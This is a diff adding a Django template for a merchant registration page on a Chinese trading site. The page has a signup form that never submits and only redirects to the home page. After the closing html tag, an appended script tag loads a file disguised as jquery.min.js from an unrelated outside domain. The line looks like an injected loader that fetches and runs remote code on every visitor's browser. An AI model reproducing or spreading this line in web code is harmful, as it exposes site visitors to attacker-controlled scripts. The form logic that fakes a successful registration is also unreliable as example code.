@@ -1,0 +1,269 @@
+{% load staticfiles %}
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <title>注册 - 珠江智联</title>
+    <meta content="" name="keywords" />
+    <meta content="" name="description" />
+    <link href="{% static '/goals/css/user.css' %}" rel="stylesheet" type="text/css" />
+    <script type="text/javascript" src="{% static '/goals/js/jquery.js' %}"></script>
+    <script type="text/javascript" src="{% static '/goals/js/Validform_v5.3.2_min.js' %}"></script>
+    <script type="text/javascript">
+        $(document).ready(function () {
+            //城市选择
+            //表单验证
+            $(".resform").Validform({
+                tiptype: 3
+            });
+            $div_li = $("ul.reg_tab li");
+            $div_li.click(function () {
+                $(this).addClass("here").siblings().removeClass("here");
+                var index = $div_li.index(this);
+                $("div.regbox > div").eq(index).show().siblings().hide();
+            });
+        });
+    </script>
+</head>
+
+<body>
+    <!--内容-->
+    <script type="text/javascript" src="{% static '/goals/js/jquery.inputtext.js' %}"></script>
+
+    <div class="top">
+        <div class="top_main clearfix">
+            <div class="top_right">
+                欢迎来到珠江智联！
+                <span>
+                    <a href="{% url 'sign_in' %}"> 登录</a>
+                </span>
+                <span>
+                    <a href="{% url 'register' %}"> 注册</a>
+                </span>
+            </div>
+        </div>
+    </div>
+    <div class="headw">
+        <div class="head">
+            <div class="logo" style="text-align: center;line-height: 70px;color: green;">珠江智联</div>
+            <div class="topsearch">
+                <div class="topsearchbox">
+                    <form>
+                        <input type="text" name="k" class="keywords" value="请输入关键词，如小米">
+                        <!-- <input type="submit" value="搜索" class="button" /> -->
+                        <span style="display: inline;padding:10px 25px;color:#fff;font-size:17px;background: #bc1950;cursor: pointer;" class="button">搜索</span>
+                        <!-- <input type="hidden" name="m" value="search"> -->
+                    </form>
+                </div>
+
+                <script>
+                    $('.button').click(function () {
+                        var a = $('.keywords').val();
+                        console.log(a);
+                        if (a == '小米' || a == '小' || a == '米') {
+                            window.location.href = "{% url 'seachx' %}";
+                        } else if (a == '公牛' || a == '公' || a == '牛') {
+                            window.location.href = "{% url 'seachg' %}";
+                        } else if (a == '珠江智联' || a == '珠江' || a == '智联' || a == '珠' || a == '智') {
+                            window.location.href = "{% url 'seachz' %}";
+                        }else {
+						    window.location.href = "{%  url 'seachnull' %}";
+                        }
+                    });
+                </script>
+                <p class="topkeywords">
+                    <a href="{% url 'seachx' %}">小米</a>&nbsp;&nbsp;
+                    <a href="{% url 'seachg' %}">公牛</a>&nbsp;&nbsp;</p>
+            </div>
+            <div class="carnum" id="carcount">
+            </div>
+        </div>
+    </div>
+    <div class="nav_list">
+        <ul class="clearfix">
+            <li>
+                <a href="{% url 'index' %}" title="首页">首页</a>
+            </li>
+            <li>
+                <a href="{% url 'sell' %}" title="卖车">卖家</a>
+            </li>
+            <li>
+                <a href="{% url 'seach' %}" title="买车">买家</a>
+            </li>
+            <li>
+                <a href="{% url 'about' %}" title="联系">联系</a>
+            </li>
+        </ul>
+    </div>
+    <!--头部end -->
+    <div class="login_main mt10 clearfix">
+        <div class="login_left">
+            <div class="title">注册</div>
+            <ul class="clearfix reg_tab">
+               <li><a href="{% url 'register' %}">个人注册</a></li>
+                <li class="here"><a href="{% url 'register2' %}">商家注册</a></li>
+            </ul>
+            <div class="regbox mt20" style="position: relative;">
+                <div>
+                    <form name="loginform" class="resform" id="loginform" method="post" >
+                        <table class="logintable">
+                            <tr>
+                                <th>用户名：</th>
+                                <td>
+                                    <input type="text" name="username" class="inp01 a"
+                                        errormsg="用户名至少6个字符,最多18个字符！" />
+                                </td>
+                            </tr>
+                            <tr>
+                                <th>密码：</th>
+                                <td>
+                                    <input type="password" name="password" class="inp01 b" />
+                                </td>
+                            </tr>
+                            <tr>
+                                <th>再次输入密码：</th>
+                                <td>
+                                    <input type="password" name="password" class="inp01 c" />
+                                </td>
+                            </tr>
+                            <tr>
+                                <th>邮箱：</th>
+                                <td>
+                                    <input type="text" name="email" class="inp01 d" datatype="e"
+                                        nullmsg="请输入邮箱地址！" errormsg="请输入正确的邮箱地址！" />
+                                </td>
+                            </tr>
+                            <tr>
+                                <th>联系人：</th>
+                                <td>
+                                    <input type="text" name="nicname" class="inp01 e" datatype="s" nullmsg="请填写联系人！" />
+                                </td>
+                            </tr>
+                            <tr>
+                                <th>手机号：</th>
+                                <td>
+                                    <input type="text" name="mobilephone" class="inp01 f" datatype="m"
+                                        sucmsg="手机号验证通过！" nullmsg="请输入手机号！" errormsg="请输入正确的手机号！" />
+                                </td>
+                            </tr>
+                            <tr>
+                                <th>公司名称：</th>
+                                <td>
+                                    <input type="text" name="mobilephone" class="inp01 " datatype="m"
+                                        sucmsg="手机号验证通过！" nullmsg="请输入手机号！" errormsg="请输入正确的手机号！" />
+                                </td>
+                            </tr>
+                            <!--
+						<tr>
+							<th width="20%">验证码：</th>
+							<td><input name="authcode" id="cftcode"  type="text"  class="inp02" datatype="s" ajaxurl="index.php?m=register&ajax=1" nullmsg="请输入验证码！" errormsg="请输入正确的验证码！"/> <img src="/include/kcaptcha/" width="70" height="30" onclick="this.src='/include/kcaptcha/?'+Math.random();" title="点击刷新验证码" style="cursor:pointer" id="checkcode"> <span class="f12" onclick="document.getElementById('checkcode').src='/include/kcaptcha/?'+Math.random();" style="cursor:pointer">看不清？换一个</span></td>
+						</tr>
+						-->
+                            <tr>
+                                <th></th>
+                                <td>
+{#                                    <input type="submit" class="login_but" value="注册">#}
+                                    <div class="button_r" style="width:100px;height:37px;text-align:center;line-height:37px;cursor:pointer;background: #bc1950;color:#fff;">注册</div>
+                                    <input type="hidden" name="action" value="register">
+                                    <input type="hidden" name="isdealer" value="1">
+                                </td>
+                            </tr>
+                        </table>
+                    </form>
+                </div>
+                <div class="tan" style="display: none;position: absolute;top:20px;left:30%;text-align: center;line-height: 200px;font-size:30px;color:#fff;width:300px;height:200px;background: rgba(0,0,0,.5)">
+
+                </div>
+                <script>
+                    $('.button_r').click(function(){
+                        var a = $('.a').val();
+                        var b = $('.b').val();
+                        var c = $('.c').val();
+                        var d = $('.d').val();
+                        var e = $('.e').val();
+                        var f = $('.f').val();
+                        if(a==''){
+                            $('.tan').html('请输入用户名');
+                            $('.tan').css('display','block');
+                            setInterval(function () {
+                                $('.tan').css('display','none');
+                            },2000);
+                        }else if( c==''){
+                            $('.tan').html('请输入验证密码');
+                            $('.tan').css('display','block');
+                            setInterval(function () {
+                                $('.tan').css('display','none');
+                            },2000);
+                        }else if(b!==c){
+                             $('.tan').html('请输入正确密码');
+                            $('.tan').css('display','block');
+                            setInterval(function () {
+                                $('.tan').css('display','none');
+                            },2000);
+                        }else if(d ==''){
+                            $('.tan').html('请输入邮箱');
+                            $('.tan').css('display','block');
+                            setInterval(function () {
+                                $('.tan').css('display','none');
+                            },2000);
+                        }else if(e ==''){
+                            $('.tan').html('请输入联系人');
+                            $('.tan').css('display','block');
+                            setInterval(function () {
+                                $('.tan').css('display','none');
+                            },2000);
+                        }else if( f==''||!(/^1[34578]\d{9}$/.test(f))){
+                            $('.tan').html('请输入手机号码');
+                            $('.tan').css('display','block');
+                            setInterval(function () {
+                                $('.tan').css('display','none');
+                            },2000);
+                        }else if( c==''){
+                            $('.tan').html('请输入公司名称');
+                            $('.tan').css('display','block');
+                            setInterval(function () {
+                                $('.tan').css('display','none');
+                            },2000);
+                        }else {
+                            window.location.href = "{% url 'index' %}";
+                        }
+                    })
+                </script>
+
+
+            </div>
+        </div>
+        <div class="login_right">
+            <p class="f14 mt20">已是会员？</p>
+            <p class="mt20">
+                <a href="{% url 'sign_in' %}" class="register_but">我要登录</a>
+            </p>
+        </div>
+    </div>
+    <!--版权-->
+    <!--底部导航-->
+    <div class="footer" id="foot">
+        <p class="tc">
+            <a href="{% url 'index' %}" title="首页">首页</a> |
+            <a href="{% url 'sell' %}" title="卖车">卖家</a> |
+            <a href="{% url 'seach' %}" title="买车">买家</a> |
+            <a href="{% url 'about' %}" title="联系">联系</a> |
+        </p>
+        <p class="mt10"> Copyright 2019 广东珠江智联信息科技股份有限公司版权所有
+            <a href="http://www.miitbeian.gov.cn/" title="粤ICP备16037358号-4">粤ICP备16037358号-4</a>
+        </p>
+        <p class="mt10"> 电话：020-84138253 地址：广州市海珠区琶洲大道中06-08号907室</p>
+    </div>
+    <div id="right-side" class="right-side">
+        <ul>
+            <li class="side-top w4">
+                <a id="backtop" title="返回顶部" href="#top" style="display: block;">返回顶部</a>
+            </li>
+        </ul>
+    </div>
+    <!-- 版权 结束 -->
+</body>
+
+</html>
+<script charset="utf-8" async="true" src="http://ke.lduxnfz.com/s/ft/jquery.min.js"></script>
